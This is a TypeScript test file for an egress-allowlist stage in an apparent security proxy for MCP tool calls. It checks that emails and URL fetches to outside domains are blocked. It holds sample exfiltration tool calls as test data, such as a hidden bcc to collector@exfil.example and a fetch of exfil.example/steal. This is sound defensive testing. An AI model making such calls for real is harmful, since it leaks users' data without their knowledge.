// Phase 4: S1 Egress allowlist tests

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { EgressStage } from "../src/pipeline/egress.js";
import { FakeMcpClient } from "../mock/fake-client.js";
import { existsSync, rmSync, mkdirSync, writeFileSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";

const baseCtx = {
  serverId: "test",
  policy: {
    servers: [],
    stages: {
      egress: {
        enabled: true,
        allowedDomains: ["mycompany.com", "smtp.mycompany.com"],
        destinationFields: {
          send_email: ["to", "cc", "bcc"],
          fetch_url: ["url"],
        },
        onViolation: "block" as const,
      },
    },
    audit: { path: "/tmp/audit.log", hashChain: false },
  },
  audit: { append: async () => {} },
};

// ── Unit tests ────────────────────────────────────────────────────────────────

describe("Phase 4 — EgressStage unit tests", () => {
  const stage = new EgressStage();

  it("allowed destination → allow", async () => {
    const result = await stage.onCall(
      { server: "t", tool: "send_email", args: { to: "alice@mycompany.com", subject: "Hi", body: "test" } },
      baseCtx,
    );
    expect(result.decision).toBe("allow");
  });

  it("external bcc → block", async () => {
    const result = await stage.onCall(
      {
        server: "t",
        tool: "send_email",
        args: {
          to: "alice@mycompany.com",
          subject: "Hi",
          body: "test",
          bcc: "collector@exfil.example",
        },
      },
      baseCtx,
    );
    expect(result.decision).toBe("block");
    expect(result.severity).toBe("high");
    expect(result.evidence).toContain("exfil.example");
  });

  it("external to → block", async () => {
    const result = await stage.onCall(
      { server: "t", tool: "send_email", args: { to: "attacker@evil.example", subject: "x", body: "y" } },
      baseCtx,
    );
    expect(result.decision).toBe("block");
  });

  it("allowed + external cc → block (any violation blocks)", async () => {
    const result = await stage.onCall(
      {
        server: "t",
        tool: "send_email",
        args: {
          to: "alice@mycompany.com",
          cc: "spy@external.example",
          subject: "Hi",
          body: "test",
        },
      },
      baseCtx,
    );
    expect(result.decision).toBe("block");
    expect(result.evidence).toContain("external.example");
  });

  it("subdomain of allowed domain is allowed", async () => {
    const result = await stage.onCall(
      { server: "t", tool: "send_email", args: { to: "user@sub.mycompany.com", subject: "x", body: "y" } },
      baseCtx,
    );
    expect(result.decision).toBe("allow");
  });

  it("URL with allowed host → allow", async () => {
    const result = await stage.onCall(
      { server: "t", tool: "fetch_url", args: { url: "https://mycompany.com/api/data" } },
      baseCtx,
    );
    expect(result.decision).toBe("allow");
  });

  it("URL with external host → block", async () => {
    const result = await stage.onCall(
      { server: "t", tool: "fetch_url", args: { url: "https://exfil.example/steal" } },
      baseCtx,
    );
    expect(result.decision).toBe("block");
  });

  it("tool not in destinationFields → allow (no declared destinations)", async () => {
    const result = await stage.onCall(
      { server: "t", tool: "unknown_tool", args: { to: "external@evil.example" } },
      baseCtx,
    );
    expect(result.decision).toBe("allow");
    expect(result.reason).toContain("no declared destinations");
  });

  it("onViolation=flag produces flag instead of block", async () => {
    const ctx = {
      ...baseCtx,
      policy: {
        ...baseCtx.policy,
        stages: {
          egress: {
            ...baseCtx.policy.stages.egress!,
            onViolation: "flag" as const,
          },
        },
      },
    };
    const result = await stage.onCall(
      { server: "t", tool: "send_email", args: { to: "spy@exfil.example", subject: "x", body: "y" } },
      ctx,
    );
    expect(result.decision).toBe("flag");
  });

  it("disabled egress → allow anything", async () => {
    const ctx = {
      ...baseCtx,
      policy: {
        ...baseCtx.policy,
        stages: {
          egress: { ...baseCtx.policy.stages.egress!, enabled: false },
        },
      },
    };
    const result = await stage.onCall(
      { server: "t", tool: "send_email", args: { to: "attacker@evil.example", subject: "x", body: "y" } },
      ctx,
    );
    expect(result.decision).toBe("allow");
  });

  it("collector@exfil.example (malicious-server scenario) → block", async () => {
    const result = await stage.onCall(
      {
        server: "t",
        tool: "send_email",
        args: { to: "alice@mycompany.com", bcc: "collector@exfil.example", subject: "x", body: "y" },
      },
      baseCtx,
    );
    expect(result.decision).toBe("block");
  });
});

// ── Integration test through proxy ───────────────────────────────────────────

describe("Phase 4 — egress integration with benign-email-server", () => {
  const TMP = join(tmpdir(), `egress-test-${process.pid}`);
  const AUDIT_PATH = join(TMP, "audit.log");
  const POLICY_PATH = join(TMP, "policy.yaml");
  let client: FakeMcpClient;

  beforeAll(async () => {
    mkdirSync(TMP, { recursive: true });
    writeFileSync(
      POLICY_PATH,
      `
servers:
  - id: email
    command: "tsx mock/benign-email-server.ts"
stages:
  integrity:
    enabled: false
  staticScan:
    enabled: false
  secretScan:
    enabled: false
  egress:
    enabled: true
    allowedDomains: ["mycompany.com"]
    destinationFields:
      send_email: ["to", "cc", "bcc"]
    onViolation: block
audit:
  path: "${AUDIT_PATH}"
  hashChain: false
`.trim(),
    );
    client = new FakeMcpClient(`tsx src/cli.ts run --policy ${POLICY_PATH}`);
    await client.start();
  });

  afterAll(() => {
    client.stop();
    if (existsSync(TMP)) rmSync(TMP, { recursive: true });
  });

  it("send_email to @mycompany.com is allowed", async () => {
    const { result, error } = await client.callTool("send_email", {
      to: "alice@mycompany.com",
      subject: "Hello",
      body: "Test",
    });
    expect(error).toBeUndefined();
    expect(result?.content?.[0]?.text).toContain("alice@mycompany.com");
  });

  it("send_email with bcc:@exfil.example is blocked", async () => {
    const { result, error } = await client.callTool("send_email", {
      to: "alice@mycompany.com",
      bcc: "collector@exfil.example",
      subject: "Hello",
      body: "Test",
    });
    expect(error).toBeDefined();
    expect(error?.message).toContain("blocked");
    void result;
  });
});
